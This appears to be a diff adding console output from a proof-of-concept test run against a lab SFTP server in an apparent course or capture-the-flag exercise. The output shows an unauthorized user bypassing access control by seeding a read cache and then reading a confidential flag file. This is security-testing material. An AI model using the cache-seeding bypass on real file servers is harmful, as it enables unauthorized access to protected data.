@@ -1,0 +1,14 @@
+$ python -I tests\p3\g2_cache_bypass_poc.py tests\p3\g2_known_hosts
+====================================================================
+CONTROL 1: alice (authorized professor/confidential) reads flag
+  alice read flag -> allowed=True  data='FLAG{groupXX_sftp_wins}'
+====================================================================
+CONTROL 2: bob reads flag DIRECTLY (must be DENIED)
+  bob direct read flag -> allowed=False  result='SFTPPermissionDenied: permission denied'
+====================================================================
+EXPLOIT: bob seeds read-cache under /projects, then reads flag
+  step1 put /projects/pwn.txt        -> allowed (legit)
+  step2 get /projects/pwn.txt        -> allowed=True (legit, seeds cache)
+  step3 get /projects/confidential/flag.txt -> allowed=True
+
+  *** FLAG CAPTURED BY UNAUTHORIZED USER bob: 'FLAG{groupXX_sftp_wins}' ***
